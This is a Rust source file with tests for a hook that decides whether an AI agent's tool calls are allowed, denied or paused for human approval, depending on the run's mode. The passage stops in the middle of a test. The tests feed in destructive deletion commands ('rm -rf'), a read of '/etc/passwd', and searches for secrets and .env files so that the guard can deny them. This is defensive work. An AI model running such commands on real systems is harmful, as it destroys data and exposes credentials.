use axum::Json;
use axum::extract::State;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::path::Path;

use crate::classifier;
use crate::runs::finalize_termination;
use crate::shadow;
use crate::state::AppState;

#[derive(Deserialize)]
pub struct PreToolUsePayload {
    // The run this decision is for (spec §3.3). `run_id == runs.id` — injected into the CLI's
    // environment as NUCLEOS_RUN_ID (Step 5) and echoed back by the hook script; there is no second
    // identifier.
    pub run_id: i64,
    pub tool_name: String,
    #[serde(default)]
    pub tool_input: Value,
}

#[derive(Serialize, Deserialize)]
pub struct Decision {
    // "allow" | "deny" | "pending_approval" (spec §3.3). To the CLI, both "deny" and
    // "pending_approval" are just "block" (the hook script maps them, Step 6); the core treats them
    // differently — see below.
    pub decision: String,
    pub reason: String,
}

pub async fn pretooluse_decision(
    State(state): State<AppState>,
    Json(payload): Json<PreToolUsePayload>,
) -> Json<Decision> {
    // Validate run_id against runs actually in flight before trusting anything derived from it (spec
    // §3.4 — the hook's environment sits inside the same cooperative trust model as the token, so the
    // core never blindly trusts what the hook sends).
    let is_in_flight = state
        .run_handles
        .lock()
        .unwrap()
        .contains_key(&payload.run_id);

    // `mode` is resolved for EVERY request, in flight or not, because it decides WHICH set of rules
    // applies — and a run that has left `run_handles` is exactly when defaulting to `real` is most
    // dangerous: the classifier permits `Read` there, so an email triage run would be handed the one
    // tool the pillar exists to keep away from a stranger's text. `cwd` stays behind the in-flight
    // check: it only feeds the classifier's path sensitivity, which is meaningful for a run that is
    // actually executing.
    let (cwd, mode) = match sqlx::query_as::<_, (Option<String>, String)>(
        "SELECT cwd, mode FROM runs WHERE id = ?",
    )
    .bind(payload.run_id)
    .fetch_optional(&state.pool)
    .await
    {
        Ok(Some((cwd, mode))) => (is_in_flight.then_some(cwd).flatten(), mode),
        Ok(None) => (None, "real".to_owned()),
        // `mode` decides WHICH set of rules applies, so an unreadable one cannot resolve to the
        // most permissive of them. `Ok(None)` above can safely default to `real` because the row is
        // genuinely absent — there is no run whose rules we are guessing at. An `Err` is different:
        // the run may well be a triage or shadow run whose barrier we would be stepping over, and
        // the pool this reads through is shared with feed appends and run-status writes, so
        // SQLITE_BUSY under contention is an ordinary event rather than a theoretical one.
        Err(error) => {
            tracing::warn!(
                run_id = payload.run_id,
                %error,
                "pretooluse-decision: failed to resolve the run's mode — failing closed"
            );
            return Json(Decision {
                decision: "deny".to_owned(),
                reason: "could not resolve the run's mode — failing closed".to_owned(),
            });
        }
    };

    // Barrier 2 of spec §5.5. A triage run is launched with no tools at all (barrier 1), so a tool
    // call arriving here means barrier 1 is not in force — which is the entire reason this branch
    // exists. There is no allowlist and no read-only exception: the run's whole job is to read text
    // a stranger wrote and answer with a verdict, and every tool is a way for that text to act.
    //
    // It returns before the classifier, so it never terminates the run and never mints a proposal.
    if mode == crate::email::TRIAGE_MODE {
        tracing::warn!(
            run_id = payload.run_id,
            tool = %payload.tool_name,
            "pretooluse-decision: a triage run attempted a tool — barrier 1 is not in force"
        );
        return Json(Decision {
            decision: "deny".to_owned(),
            reason: "email triage runs have no tools".to_owned(),
        });
    }

    // Orchestrator (assistant) turns are constrained to the NucleOS MCP tools by their tool policy
    // (`ToolPolicy::McpOnly`) and delegate all real work to governed runs, so they must NOT go
    // through the autopilot classifier — doing so would terminate the turn and mint action-approval proposals it
    // can never satisfy (a resume expects a worktree run). Allow the sanctioned MCP tools, block
    // everything else, and never create a proposal or terminate the turn.
    if mode == "assistant" {
        return if payload.tool_name.starts_with("mcp__nucleos__") {
            Json(Decision {
                decision: "allow".to_owned(),
                reason: "orchestrator NucleOS tool".to_owned(),
            })
        } else {
            Json(Decision {
                decision: "deny".to_owned(),
                reason: "the orchestrator is restricted to NucleOS tools".to_owned(),
            })
        };
    }

    let classification = classifier::classify(
        &payload.tool_name,
        &payload.tool_input,
        cwd.as_deref().map(Path::new),
    );
    tracing::info!(
        tool_name = %payload.tool_name,
        decision = %classification.decision.decision,
        action_class = classification.action_class,
        reason = %classification.reason,
        "pretooluse-decision: classified action"
    );

    if mode == "shadow" {
        // Gated on the run being in flight, which is what the mode lookup above used to guarantee
        // implicitly. A scoreboard is a record of decisions taken over live runs; a stray call
        // naming a finished run is not one of those.
        if is_in_flight
            && let Err(error) = shadow::record_decision(
                &state.pool,
                payload.run_id,
                &payload.tool_name,
                &payload.tool_input,
                &classification,
            )
            .await
        {
            tracing::warn!(
                run_id = payload.run_id,
                %error,
                "pretooluse-decision: failed to record shadow decision"
            );
        }

        let read_only = matches!(payload.tool_name.as_str(), "Read" | "Grep" | "Glob")
            || (payload.tool_name == "Bash" && classification.action_class == "read-local");
        return if read_only {
            Json(Decision {
                decision: "allow".to_owned(),
                reason: "shadow mode permits this read-only tool".to_owned(),
            })
        } else {
            Json(Decision {
                decision: "deny".to_owned(),
                reason: "shadow mode blocks tools that are not read-only".to_owned(),
            })
        };
    }

    if mode == "worktree"
        && is_in_flight
        && let Err(error) = shadow::record_decision(
            &state.pool,
            payload.run_id,
            &payload.tool_name,
            &payload.tool_input,
            &classification,
        )
        .await
    {
        tracing::warn!(
            run_id = payload.run_id,
            %error,
            "pretooluse-decision: failed to record shadow decision"
        );
    }

    // Single-use authorization (spec §8.4 step 6): a resume run's FIRST high-risk action that
    // matches the approved tool AND the approved input is allowed exactly once, overriding the
    // pending_approval. Only a pending_approval is ever lifted — a `deny` (destructive) never
    // reaches this check, so a grant can never launder a denied action.
    //
    // The input is part of the match, not decoration: `tool_name` is "Bash" for every shell action,
    // so without it an approved `git push` authorized whatever this run tried next.
    if classification.decision.decision == "pending_approval" && is_in_flight {
        match crate::proposals::consume_matching_grant(
            &state.pool,
            payload.run_id,
            &payload.tool_name,
            &payload.tool_input.to_string(),
        )
        .await
        {
            Ok(true) => {
                tracing::info!(
                    run_id = payload.run_id,
                    tool = %payload.tool_name,
                    "pretooluse-decision: single-use grant consumed — authorizing the approved action"
                );
                let _ = crate::feed::append(
                    &state.pool,
                    None,
                    "action_authorized",
                    &format!(
                        "authorized approved {} action for run {}",
                        payload.tool_name, payload.run_id
                    ),
                    Some(payload.run_id),
                )
                .await;
                return Json(Decision {
                    decision: "allow".to_owned(),
                    reason: "single-use authorization for an approved action".to_owned(),
                });
            }
            Ok(false) => {}
            Err(error) => {
                tracing::warn!(
                    run_id = payload.run_id,
                    %error,
                    "pretooluse-decision: grant lookup failed; falling back to the classifier decision"
                );
            }
        }
    }

    if classification.decision.decision == "pending_approval" {
        // Only for a genuinely in-flight run_id — an unknown/stale one must not terminate anything.
        if is_in_flight {
            // In its own task, on purpose. Terminating the run kills the CLI whose hook script owns
            // the connection this handler is answering, and that script gives up after 5s anyway
            // (`ask_daemon.py`'s `timeout=5`) — so the request can disappear mid-handler, and a
            // dropped request drops the handler future exactly the way `abort()` does. Awaiting the
            // JoinHandle keeps the response as synchronous as before; dropping a JoinHandle only
            // detaches its task, so the pause still gets recorded when the request goes away.
            let _ = tokio::spawn(pause_for_approval(
                state.clone(),
                payload.run_id,
                payload.tool_name.clone(),
                payload.tool_input.to_string(),
                classification.reason.clone(),
            ))
            .await;
        } else {
            tracing::warn!(
                "pretooluse-decision: pending_approval for unknown/finished run_id {} — not terminating",
                payload.run_id
            );
        }
    }

    Json(classification.decision)
}

/// The whole `pending_approval` act: terminate the run, then record the proposal that makes the
/// pause actionable. These two belong together — a run parked in `awaiting_approval` with no
/// proposal can be neither approved nor rejected, and `one_open_worktree_run_per_project`
/// (migration 0009) makes it block every later worktree run for that project, permanently: startup
/// recovery only reconciles rows left `running`. Hence the caller runs this as a detachable task
/// rather than inline in a request that may not survive its own side effects.
async fn pause_for_approval(
    state: AppState,
    run_id: i64,
    tool_name: String,
    tool_input: String,
    reason: String,
) {
    // Active termination (spec §8.4 steps 2–3): drive the run to `awaiting_approval` via the same
    // atomic-handle-removal arbiter cancellation uses (`finalize_termination`, Chunk 2 Task 4).
    if !finalize_termination(&state, run_id, "awaiting_approval").await {
        return;
    }

    let (session_id, project_id) = sqlx::query_as::<_, (Option<String>, Option<String>)>(
        "SELECT session_id, project_id FROM runs WHERE id = ?",
    )
    .bind(run_id)
    .fetch_optional(&state.pool)
    .await
    .ok()
    .flatten()
    .unwrap_or((None, None));

    if let Err(error) = crate::proposals::create_action_approval(
        &state.pool,
        run_id,
        session_id.as_deref(),
        project_id.as_deref(),
        &tool_name,
        &reason,
        Some(&tool_input),
    )
    .await
    {
        tracing::warn!(
            run_id,
            %error,
            "pretooluse-decision: failed to record action-approval proposal"
        );
        let _ = crate::feed::append(
            &state.pool,
            project_id.as_deref(),
            "proposal_record_failed",
            &format!("failed to record action-approval proposal: {error}"),
            Some(run_id),
        )
        .await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::auth::Token;
    use crate::proposals;
    use crate::runner::FakeCommandRunner;
    use axum::Router;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use axum::routing::post;
    use std::sync::Arc;
    use tower::ServiceExt;

    async fn test_state() -> AppState {
        let pool = sqlx::sqlite::SqlitePoolOptions::new()
            .max_connections(1)
            .connect_with(
                sqlx::sqlite::SqliteConnectOptions::new()
                    .filename(":memory:")
                    .create_if_missing(true),
            )
            .await
            .unwrap();
        sqlx::migrate!().run(&pool).await.unwrap();
        AppState {
            token: Token("test-token".into()),
            pool,
            runner: Arc::new(FakeCommandRunner::default()),
            run_handles: Arc::new(std::sync::Mutex::new(std::collections::HashMap::new())),
            email: std::sync::Arc::new(crate::state::EmailRuntime::default()),
            run_timeout: crate::state::DEFAULT_RUN_TIMEOUT,
        }
    }

    fn test_router(state: AppState) -> Router {
        Router::new()
            .route("/hooks/pretooluse-decision", post(pretooluse_decision))
            .with_state(state)
    }

    async fn decide(app: &Router, body: &str) -> Decision {
        let response = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/hooks/pretooluse-decision")
                    .header("content-type", "application/json")
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        serde_json::from_slice(&bytes).unwrap()
    }

    /// Insert a `runs` row and spawn a long-sleeping task whose abort handle is registered under
    /// the row's id, making that run look in-flight to `pretooluse_decision` the same way a real
    /// governed run does. `project_id`, `cwd`, and `session_id` are `None` for tests that don't
    /// care about them; `created_at` is a fixed placeholder since no test ever asserts on it.
    async fn in_flight_run(
        state: &AppState,
        mode: &str,
        project_id: Option<&str>,
        cwd: Option<&str>,
        session_id: Option<&str>,
    ) -> i64 {
        let run_id = sqlx::query(
            "INSERT INTO runs (prompt, status, mode, project_id, cwd, session_id, created_at)
             VALUES ('x', 'running', ?, ?, ?, ?, '2026-07-17T00:00:00Z')",
        )
        .bind(mode)
        .bind(project_id)
        .bind(cwd)
        .bind(session_id)
        .execute(&state.pool)
        .await
        .unwrap()
        .last_insert_rowid();

        let task =
            tokio::spawn(async { tokio::time::sleep(std::time::Duration::from_secs(60)).await });
        state
            .run_handles
            .lock()
            .unwrap()
            .insert(run_id, task.abort_handle());

        run_id
    }

    /// A `runs` row without an abort handle: the run exists and its mode is on record, but nothing
    /// is executing under it. Every barrier that reads `mode` has to hold here too, because this is
    /// the state a run passes through on its way out — and the state a forged request would claim.
    async fn out_of_flight_run(state: &AppState, mode: &str) -> i64 {
        sqlx::query(
            "INSERT INTO runs (prompt, status, mode, created_at)
             VALUES ('x', 'completed', ?, '2026-07-28T00:00:00Z')",
        )
        .bind(mode)
        .execute(&state.pool)
        .await
        .unwrap()
        .last_insert_rowid()
    }

    /// The single most important assertion in this pillar: a triage run gets NO tool, of any kind.
    /// Barrier 1 means the CLI should never offer one — this is what happens if it does.
    #[tokio::test]
    async fn a_triage_run_is_denied_every_tool() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, crate::email::TRIAGE_MODE, None, None, None).await;
        let app = test_router(state);

        for (tool, input) in [
            ("Bash", serde_json::json!({"command": "ls -la"})),
            ("Read", serde_json::json!({"file_path": "/etc/passwd"})),
            (
                "Edit",
                serde_json::json!({"file_path": "a", "new_string": "b"}),
            ),
            (
                "Write",
                serde_json::json!({"file_path": "a", "content": "b"}),
            ),
            ("Grep", serde_json::json!({"pattern": "secret"})),
            ("Glob", serde_json::json!({"pattern": "**/*.env"})),
            ("mcp__nucleos__create_run", serde_json::json!({})),
            (
                "mcp__claude_ai_Google_Drive__create_file",
                serde_json::json!({}),
            ),
        ] {
            let body = serde_json::json!({
                "run_id": run_id,
                "tool_name": tool,
                "tool_input": input,
            })
            .to_string();
            let decision = decide(&app, &body).await;
            assert_eq!(decision.decision, "deny", "{tool} must be denied");
            assert_eq!(decision.reason, "email triage runs have no tools");
        }
    }

    /// `ls -la` is the case that proves the fallthrough was real: the classifier calls it
    /// read-local and ALLOWS it, so before `mode` was resolved for out-of-flight runs, a triage run
    /// that had left `run_handles` was handed a shell.
    #[tokio::test]
    async fn a_triage_run_stays_denied_once_it_leaves_the_handle_map() {
        let state = test_state().await;
        let run_id = out_of_flight_run(&state, crate::email::TRIAGE_MODE).await;
        let app = test_router(state);

        let body = serde_json::json!({
            "run_id": run_id,
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
        })
        .to_string();
        let decision = decide(&app, &body).await;
        assert_eq!(decision.decision, "deny");
        assert_eq!(decision.reason, "email triage runs have no tools");
    }

    #[tokio::test]
    async fn an_out_of_flight_orchestrator_turn_is_denied_rather_than_classified() {
        let state = test_state().await;
        let run_id = out_of_flight_run(&state, "assistant").await;
        let app = test_router(state);

        let body = serde_json::json!({
            "run_id": run_id,
            "tool_name": "Read",
            "tool_input": {"file_path": "/etc/passwd"},
        })
        .to_string();
        let decision = decide(&app, &body).await;
        assert_eq!(decision.decision, "deny");
        assert_eq!(
            decision.reason,
            "the orchestrator is restricted to NucleOS tools"
        );
    }

    /// The no-regression half of the lift: resolving `mode` outside the in-flight check must not
    /// have narrowed what a shadow run may do.
    #[tokio::test]
    async fn an_out_of_flight_shadow_run_still_allows_read_only_tools() {
        let state = test_state().await;
        let run_id = out_of_flight_run(&state, "shadow").await;
        let app = test_router(state);

        for tool in ["Read", "Grep", "Glob"] {
            let body = serde_json::json!({
                "run_id": run_id,
                "tool_name": tool,
                "tool_input": {"file_path": "src/main.rs", "pattern": "fn"},
            })
            .to_string();
            let decision = decide(&app, &body).await;
            assert_eq!(decision.decision, "allow", "{tool}");
        }
    }

    /// The scoreboard records decisions taken over live runs. A call naming a run that is no longer
    /// executing is not one, and counting it would quietly inflate the promotion gate's evidence.
    #[tokio::test]
    async fn an_out_of_flight_run_records_no_shadow_decision() {
        let state = test_state().await;
        let pool = state.pool.clone();
        let shadow_id = out_of_flight_run(&state, "shadow").await;
        let worktree_id = out_of_flight_run(&state, "worktree").await;
        let app = test_router(state);

        for run_id in [shadow_id, worktree_id] {
            let body = serde_json::json!({
                "run_id": run_id,
                "tool_name": "Read",
                "tool_input": {"file_path": "src/main.rs"},
            })
            .to_string();
            decide(&app, &body).await;
        }

        let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM shadow_decisions")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(recorded, 0);
    }

    #[tokio::test]
    async fn denies_rm_rf() {
        let app = test_router(test_state().await);
        let decision = decide(
            &app,
            r#"{"run_id":0,"tool_name":"Bash","tool_input":{"command":"rm -rf /tmp/x"}}"#,
        )
        .await;
        assert_eq!(decision.decision, "deny");
        assert_eq!(decision.reason, "destructive deletion commands are denied");
    }

    #[tokio::test]
    async fn allows_safe_read_command() {
        let app = test_router(test_state().await);
        let decision = decide(
            &app,
            r#"{"run_id":0,"tool_name":"Bash","tool_input":{"command":"ls -la"}}"#,
        )
        .await;
        assert_eq!(decision.decision, "allow");
        assert_eq!(decision.reason, "recognized non-mutating shell command");
    }

    #[tokio::test]
    async fn pends_unrecognized_command() {
        let tool_input = serde_json::json!({"command": "echo hi"});
        let classification = classifier::classify("Bash", &tool_input, None);
        assert_eq!(classification.action_class, "unrecognized");

        let app = test_router(test_state().await);
        let decision = decide(
            &app,
            r#"{"run_id":0,"tool_name":"Bash","tool_input":{"command":"echo hi"}}"#,
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");
    }

    #[tokio::test]
    async fn git_push_pends_approval_and_terminates_the_run() {
        let state = test_state().await;

        // Stand up a fake in-flight run: a runs row plus a live task whose abort handle is registered
        // under the same id (that's the `run_id` the hook will send).
        let run_id = in_flight_run(&state, "real", None, None, None).await;

        let app = test_router(state.clone());
        let body = format!(
            r#"{{"run_id":{run_id},"tool_name":"Bash","tool_input":{{"command":"git push origin main"}}}}"#
        );
        let decision = decide(&app, &body).await;
        assert_eq!(decision.decision, "pending_approval");
        assert_eq!(
            decision.reason,
            "push, merge, deploy, publish, and tag actions require approval"
        );

        // The run was actively terminated into awaiting_approval, and its handle removed (spec §8.4).
        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");
        assert!(!state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    #[tokio::test]
    async fn edit_to_autopilot_config_pends_approval_and_terminates_the_run() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "real", None, Some("C:\\work\\repo"), None).await;

        let app = test_router(state.clone());
        let body = format!(
            r#"{{"run_id":{run_id},"tool_name":"Edit","tool_input":{{"file_path":".ai/autopilot.yaml"}}}}"#
        );
        let decision = decide(&app, &body).await;
        assert_eq!(decision.decision, "pending_approval");
        assert_eq!(
            decision.reason,
            "changes to autopilot governance files require approval"
        );

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");
        assert!(!state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    /// Terminating the run kills the CLI whose hook script owns the very connection this handler is
    /// serving, and that script gives up after 5s anyway (`ask_daemon.py`'s `timeout=5`). Either way
    /// the request can vanish mid-handler, and a dropped request drops the handler future exactly the
    /// way `abort()` does — so everything sequenced after the termination is lost.
    ///
    /// The loss is unrecoverable, not merely untidy: a run parked in `awaiting_approval` with no
    /// proposal can be neither approved nor rejected, and `one_open_worktree_run_per_project`
    /// (migration 0009) then makes it block every later worktree run for that project. Startup
    /// recovery does not help — it only reconciles rows left `running`.
    #[tokio::test]
    async fn a_dropped_hook_request_still_records_the_approval_proposal() {
        use std::future::Future;

        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", Some("proj-1"), None, None).await;

        let mut handler = Box::pin(pretooluse_decision(
            State(state.clone()),
            Json(PreToolUsePayload {
                run_id,
                tool_name: "Bash".to_owned(),
                tool_input: serde_json::json!({"command": "git push origin main"}),
            }),
        ));

        // Drive the handler by hand so the request can be dropped at a chosen point: the instant the
        // irreversible half is done. Removing the abort handle is that point of no return — it is the
        // arbiter that decides this call owns the termination, and it runs before any recording work.
        let mut context = std::task::Context::from_waker(std::task::Waker::noop());
        let mut terminated = false;
        for _ in 0..10_000 {
            assert!(
                handler.as_mut().poll(&mut context).is_pending(),
                "the handler ran to completion before the request could be dropped"
            );
            if !state.run_handles.lock().unwrap().contains_key(&run_id) {
                terminated = true;
                break;
            }
            tokio::task::yield_now().await;
        }
        assert!(terminated, "the handler never terminated the run");
        drop(handler);

        for _ in 0..100 {
            if !proposals::list_pending(&state.pool)
                .await
                .unwrap()
                .is_empty()
            {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(20)).await;
        }
        let pending = proposals::list_pending(&state.pool).await.unwrap();
        assert_eq!(
            pending.len(),
            1,
            "a paused run with no proposal is stuck forever and blocks its project"
        );
        assert_eq!(pending[0].run_id, Some(run_id));
        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");
    }

    #[tokio::test]
    async fn cwd_dependent_delete_outside_workspace_denies_through_the_handler() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "real", None, Some("C:\\work\\repo"), None).await;

        let app = test_router(state.clone());
        let body = format!(
            r#"{{"run_id":{run_id},"tool_name":"Bash","tool_input":{{"command":"rm ../outside/x"}}}}"#
        );
        let decision = decide(&app, &body).await;
        assert_eq!(decision.decision, "deny");
        assert_eq!(decision.reason, "destructive deletion commands are denied");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    #[tokio::test]
    async fn worktree_allows_and_records_an_ordinary_edit() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        let app = test_router(state.clone());

        let tool_input = serde_json::json!({"file_path": "src/ordinary.rs"});
        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Edit",
                "tool_input": tool_input
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "allow");

        let row: (String, String, String) = sqlx::query_as(
            "SELECT decision, action_class, tool_input FROM shadow_decisions
             WHERE run_id = ? AND tool_name = 'Edit'",
        )
        .bind(run_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();
        assert_eq!(row.0, "allow");
        assert_eq!(row.1, "read-local");
        assert_eq!(row.2, tool_input.to_string());

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    #[tokio::test]
    async fn worktree_denies_and_records_a_destructive_delete_without_terminating() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Bash",
                "tool_input": {"command": "rm -rf target"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "deny");

        let row: (String, String) = sqlx::query_as(
            "SELECT decision, action_class FROM shadow_decisions
             WHERE run_id = ? AND tool_name = 'Bash'",
        )
        .bind(run_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();
        assert_eq!(row.0, "deny");
        assert_eq!(row.1, "destructive");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    #[tokio::test]
    async fn worktree_pends_and_terminates_on_git_push_and_records_it() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Bash",
                "tool_input": {"command": "git push origin main"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");

        let row: (String, String) = sqlx::query_as(
            "SELECT decision, action_class FROM shadow_decisions
             WHERE run_id = ? AND tool_name = 'Bash'",
        )
        .bind(run_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();
        assert_eq!(row.0, "pending_approval");
        assert_eq!(row.1, "push-merge-deploy");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");
        assert!(!state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    #[tokio::test]
    async fn shadow_read_only_brake_records_would_decisions_without_terminating() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "shadow", None, Some("C:\\work\\repo"), None).await;
        let app = test_router(state.clone());

        let edit_input = serde_json::json!({"file_path": "src/ordinary.rs"});
        let edit = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Edit",
                "tool_input": edit_input
            })
            .to_string(),
        )
        .await;
        assert_eq!(edit.decision, "deny");

        let row: (String, String, String) = sqlx::query_as(
            "SELECT decision, action_class, tool_input FROM shadow_decisions
             WHERE run_id = ? AND tool_name = 'Edit'",
        )
        .bind(run_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();
        assert_eq!(row.0, "allow");
        assert_eq!(row.1, "read-local");
        assert_eq!(row.2, edit_input.to_string());

        let read = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Read",
                "tool_input": {"file_path": "src/lib.rs"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(read.decision, "allow");

        let push = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Bash",
                "tool_input": {"command": "git push origin main"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(push.decision, "deny");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_ne!(status, "awaiting_approval");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
    }

    #[tokio::test]
    async fn git_push_pause_creates_a_pending_action_approval_proposal() {
        let state = test_state().await;
        let run_id = in_flight_run(
            &state,
            "worktree",
            Some("proj"),
            Some("C:\\work\\repo"),
            Some("sess-x"),
        )
        .await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Bash",
                "tool_input": {"command": "git push origin main"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");

        let pending = proposals::list_pending(&state.pool).await.unwrap();
        assert_eq!(pending.len(), 1);
        let proposal = &pending[0];
        assert_eq!(proposal.run_id, Some(run_id));
        assert_eq!(proposal.tool_name.as_deref(), Some("Bash"));
        assert_eq!(proposal.session_id.as_deref(), Some("sess-x"));
        assert_eq!(proposal.project_id.as_deref(), Some("proj"));
        assert_eq!(proposal.status, "pending");
        assert!(!proposal.reasoning.is_empty());
    }

    #[tokio::test]
    async fn assistant_turn_allows_nucleos_mcp_tool() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "assistant", None, None, None).await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "mcp__nucleos__list_projects",
                "tool_input": {}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "allow");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(
            proposals::list_pending(&state.pool)
                .await
                .unwrap()
                .is_empty()
        );
    }

    #[tokio::test]
    async fn assistant_turn_denies_non_mcp_tool_and_creates_no_proposal() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "assistant", None, None, None).await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "ToolSearch",
                "tool_input": {}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "deny");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
        assert!(
            proposals::list_pending(&state.pool)
                .await
                .unwrap()
                .is_empty()
        );
    }

    #[tokio::test]
    async fn self_governing_edit_pause_creates_a_proposal_with_edit_tool() {
        let state = test_state().await;
        let run_id = in_flight_run(
            &state,
            "worktree",
            Some("proj"),
            Some("C:\\work\\repo"),
            Some("sess-e"),
        )
        .await;
        let app = test_router(state.clone());

        let decision = decide(
            &app,
            &serde_json::json!({
                "run_id": run_id,
                "tool_name": "Edit",
                "tool_input": {"file_path": ".ai/autopilot.yaml"}
            })
            .to_string(),
        )
        .await;
        assert_eq!(decision.decision, "pending_approval");

        let pending = proposals::list_pending(&state.pool).await.unwrap();
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].tool_name.as_deref(), Some("Edit"));
        assert_eq!(pending[0].run_id, Some(run_id));
    }

    #[tokio::test]
    async fn granted_action_is_authorized_once_then_falls_back() {
        let state = test_state().await;
        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
        proposals::grant_action(
            &state.pool,
            run_id,
            "Bash",
            Some(r#"{"command":"git push origin main"}"#),
            1,
        )
        .await
        .unwrap();
        let app = test_router(state.clone());
        let body = serde_json::json!({
            "run_id": run_id,
            "tool_name": "Bash",
            "tool_input": {"command": "git push origin main"}
        })
        .to_string();

        let first = decide(&app, &body).await;
        assert_eq!(first.decision, "allow");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "running");
        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));

        let consumed_at: Option<String> =
            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
                .bind(run_id)
                .fetch_one(&state.pool)
                .await
                .unwrap();
        assert!(consumed_at.is_some());

        let second = decide(&app, &body).await;
        assert_eq!(second.decision, "pending_approval");

        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
            .bind(run_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();
        assert_eq!(status, "awaiting_approval");
    }

    #[tokio::test]
